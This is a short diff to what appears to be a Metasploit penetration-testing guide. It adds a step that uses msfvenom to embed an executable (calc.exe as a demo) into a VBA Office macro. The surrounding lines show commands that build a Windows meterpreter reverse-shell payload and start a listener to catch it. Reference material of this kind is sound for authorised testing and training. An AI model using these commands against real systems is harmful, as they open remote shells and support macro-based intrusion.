@@ -55,3 +55,5 @@ Metasploit is a powerful open-source framework widely used for penetration testi
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<receiver_ip> LPORT=<receiver_port> -f exe -o payload.exe
 - Msfconsole Start Listener:
     msfconsole -qx "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST=<receiver_ip>; set LPORT=<receiver_port>; run"
+- Embed Calculator within Macro:
+    msfvenom -p generic/custom PAYLOADFILE=/home/user/Downloads/calc.exe -a x64 --platform windows -f vba-exe
